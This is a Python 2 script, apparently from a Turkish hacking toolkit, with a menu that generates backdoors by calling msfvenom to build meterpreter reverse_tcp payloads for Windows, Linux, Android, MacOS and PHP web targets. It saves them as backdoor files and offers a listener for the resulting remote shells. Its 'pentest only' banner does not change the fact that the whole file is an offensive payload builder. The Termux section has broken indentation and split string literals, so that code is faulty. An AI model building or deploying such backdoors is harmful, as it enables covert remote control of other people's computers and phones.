#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os 
import sys
import socket
sys.path.append('core/')
from listener import *

print("""

------------------------------------------------------------

Bu toolu illegal sekilde kullanıma kapalıdır. Sadece pentest
denemelerınde kullanımak üzere düzenlenmiştir

   Yapımcı : Coded By venom0x16

   Düzenleyici : SAFE PENTEST Coded By MrZone

-------------------------------------------------------------


1) BackDoors 
2) Listener

""")

choice = raw_input("İslem Sec :  ")

if(choice=="1"):
	print("""


1. Backdoor for Windows
2. Backdoor for Linux
3. Backdoor for Android
4. Backdoor for MacOS
5. Backdoor for Web
6. Termux Bölümü

       """)
	bd = raw_input("Birini Sec : ")

	if(bd=="1"):
		os.system("clear")
		os.system("figlet WINDOWS BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + lhost + " lport="  + lport + " -f exe > /root/Desktop/backdoor.exe")
		print("(*) MrZone'na selam söyle :D ")

	if(bd=="2"):
		os.system("clear")
		os.system("figlet LINUX BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p python/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /root/Desktop/backdoor.py")
		print("(*) MrZone'na selam söyle :D")


	if(bd=="3"):
		os.system("clear")
		os.system("figlet ANDROID BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p  android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /root/Desktop/backdoor.apk")
		print("(*) MrZone'na selam söyle :D")


	if(bd=="4"):
		os.system("clear")
		os.system("figlet MacOS BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p  java/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " -f jar > /root/Desktop/backdoor.jar")
		print("(*) MrZone'na selam söyle :D")


	if(bd=="5"):
		os.system("clear")
		os.system("figlet WEB BACKDOOR")
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.system("msfvenom -p  php/meterpreter/reverse_tcp lhost= " + lhost + " lport= " + lport + " > /root/Desktop/backdoor.php")
		print("(*) MrZone'na selam söyle :D")

        if(bd=="6"):                
                if(choice=="1"):
                        print("""


                1. Backdoor for Windows
                2. Backdoor for Linux
                3. Backdoor for Android
                4. Backdoor for MacOS
                5. Backdoor for Web


                                """)
                                bd = raw_input("Birini Sec : ")

                                if(bd=="1"):
                                        os.system("clear")
                                        os.system("figlet WINDOWS BACKDOOR")
                                        lhost = raw_input("LHOST: ")
                                        lport = raw_input("LPORT: ")
                                        os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + lhost + " lport="  + lport + " -f exe > /data/data/com.termux/files/home
                        /backdoor.exe")
                                        print("(*) MrZone'na selam söyle :D")

                                if(bd=="2"):
                                        os.system("clear")
                                        os.system("figlet LINUX BACKDOOR")
                                        lhost = raw_input("LHOST: ")
                                        lport = raw_input("LPORT: ")
                                        os.system("msfvenom -p python/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /data/data/com.termux/files/home
                        /backdoor.py")
                                        print("(*) MrZone'na selam söyle :D")


                                if(bd=="3"):
                                        os.system("clear")
                                        os.system("figlet ANDROID BACKDOOR")
                                        lhost = raw_input("LHOST: ")
                                        lport = raw_input("LPORT: ")
                                        os.system("msfvenom -p  android/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " > /data/data/com.termux/files/home
                        /backdoor.apk")
                                        print("(*) MrZone'na selam söyle :D")


                                if(bd=="4"):
                                        os.system("clear")
                                        os.system("figlet MacOS BACKDOOR")
                                        lhost = raw_input("LHOST: ")
                                        lport = raw_input("LPORT: ")
                                        os.system("msfvenom -p  java/meterpreter/reverse_tcp lhost=" + lhost + " lport=" + lport + " -f jar > /data/data/com.termux/files/home
                        /backdoor.jar")
                                        print("(*) MrZone'na selam söyle :D")


                                if(bd=="5"):
                                        os.system("clear")
                                        os.system("figlet WEB BACKDOOR")
                                        lhost = raw_input("LHOST: ")
                                        lport = raw_input("LPORT: ")
                                        os.system("msfvenom -p  php/meterpreter/reverse_tcp lhost= " + lhost + " lport= " + lport + " > /data/data/com.termux/files/home
                        /backdoor.php")
                                        print("(*) MrZone'na selam söyle :D")    

if(choice=="2"):
	listener()


	 


	

		
	 
 
                         
                                          
